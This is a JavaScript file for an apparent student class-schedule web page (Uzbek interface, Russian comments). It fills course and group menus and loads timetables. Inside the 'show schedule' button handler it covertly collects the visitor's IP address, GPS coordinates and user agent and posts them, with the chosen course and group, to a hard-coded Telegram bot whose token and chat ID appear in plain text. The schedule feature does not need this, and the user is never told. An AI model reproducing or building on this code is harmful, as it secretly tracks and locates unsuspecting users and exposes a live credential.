document.addEventListener("DOMContentLoaded", function() {
  // Сначала наполняем список групп для выбранного курса
  const courseSelect = document.getElementById('course');
  const groupSelect = document.getElementById('group');
  
  // Функция для обновления списка групп в зависимости от курса
  function updateGroups(course) {
    let groups = [];
    if (course === "1-course") {
      groups = ["1--24", "2--24", "3--24", "4--24", "6--24", "6--24", "7--24", "8--24", "9--24"];
    } else if (course === "2-course") {
      groups = ["1--23", "2--23", "3--23", "4--23", "5--23", "6--23", "7--23", "8--23", "9--23", "10--23"];
    }

    // Очищаем список групп и добавляем новые опции
    groupSelect.innerHTML = "";
    groups.forEach(group => {
      const option = document.createElement('option');
      option.value = group;
      option.textContent = group.replace("-", " ");
      groupSelect.appendChild(option);
    });
  }

  // Обновляем группы при изменении курса
  courseSelect.addEventListener('change', function() {
    updateGroups(courseSelect.value);
  });

  // Сначала обновляем группы для первого курса
  updateGroups(courseSelect.value);

  // Обработчик для кнопки "Jadvalni ko'rsatish"
  document.getElementById('show-schedule').addEventListener('click', function() {
    const course = courseSelect.value;
    const group = groupSelect.value;
    const day = document.getElementById('day').value;

    // Получаем IP-адрес пользователя с помощью ipify API
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        const userIp = data.ip;  // Получаем IP-адрес

        // Получаем информацию о местоположении с помощью геолокации
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(function(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            // Получаем информацию о пользователе
            const userAgent = navigator.userAgent;  // Информация о браузере и устройстве

            // Формируем сообщение с курсом, группой, IP, местоположением и устройством
            const message = `Sizning dasturingizni ochgan foydalanuvchi ma'lumotlari:\n\n` +
                            `Kurs: ${course}\n` +
                            `Guruh: ${group}\n` +
                            `IP-manzil: ${userIp}\n` +
                            `Maqom (latitude, longitude): ${latitude}, ${longitude}\n` +
                            `Telefon/kompyuter: ${userAgent}`;

            // Отправляем запрос на Telegram через Webhook
            fetch('https://api.telegram.org/bot8073879581:AAH-4aRkvCrxv7oiKBa8Ere_Z95hG21tBdU/sendMessage', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                chat_id: '7518382960',  // Ваш Telegram ID или ID группы
                text: message
              })
            })
            .then(response => response.json())
            .then(data => {
              console.log('Message sent to Telegram:', data);
            })
            .catch(error => {
              console.error('Error:', error);
            });

          }, function(error) {
            console.error('Ошибка при получении местоположения:', error);
          });
        } else {
          alert("Geolokatsiya xizmati qo\'llab-quvvatlanmayapti.");
        }
      })
      .catch(error => {
        console.error('Error fetching IP address:', error);
      });

    // Загружаем расписание
    fetch(`courses/${course}/${group}.json`)
      .then(response => response.json())
      .then(data => {
        const schedule = data[day];
        
        // Получаем таблицу и очищаем её
        const tableBody = document.getElementById('schedule-table').getElementsByTagName('tbody')[0];
        tableBody.innerHTML = "";

        // Заполняем таблицу уроками
        if (schedule) {
          schedule.forEach(lesson => {
            const row = tableBody.insertRow();
            const lessonCell = row.insertCell(0);
            const timeCell = row.insertCell(1);
            lessonCell.textContent = lesson.lesson;
            timeCell.textContent = lesson.time;
          });
        } else {
          const row = tableBody.insertRow();
          const noLessonsCell = row.insertCell(0);
          noLessonsCell.colSpan = 2;
          noLessonsCell.textContent = "Uroklar bu kunda yo'q";
        }
      })
      .catch(error => {
        console.error('Xatolik:', error);
        alert('Xatolik yuz berdi. Fayl manzili to\'g\'ri ekanligini tekshiring.');
      });
  });

  // Функция для открытия модального окна
  const authorBtn = document.getElementById('author-btn');
  const authorModal = document.getElementById('author-modal');
  const closeBtn = document.getElementById('close-btn');

  // Открытие модального окна
  authorBtn.addEventListener('click', function() {
    authorModal.style.display = "block";
  });

  // Закрытие модального окна
  closeBtn.addEventListener('click', function() {
    authorModal.style.display = "none";
  });

  // Закрытие модального окна при клике вне его
  window.addEventListener('click', function(event) {
    if (event.target === authorModal) {
      authorModal.style.display = "none";
    }
  });
});
